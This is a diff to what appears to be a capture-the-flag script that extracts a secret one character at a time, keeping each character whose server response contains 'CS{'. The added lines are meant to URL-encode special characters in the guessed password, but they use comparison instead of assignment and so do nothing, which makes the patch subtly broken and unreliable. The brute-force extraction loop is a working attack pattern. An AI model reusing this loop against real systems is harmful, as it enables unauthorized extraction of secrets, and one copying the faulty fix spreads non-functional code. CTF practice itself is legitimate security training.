@@ -14,6 +14,15 @@ def main():
     
     while True:
         for printable in chars:
+            # decode p caracteres especiais na senha
+            if (printable == "*"):
+                printable == "%2A"
+            if (printable == "+"):
+                printable == "%2B"
+            if (printable == "."):
+                printable == "%2E"
+            if (printable == "?"):
+                printable == "%3F"  
             result = extracao(valor_completo, printable)
             if "CS{" in result:
                 valor_completo = valor_completo + printable
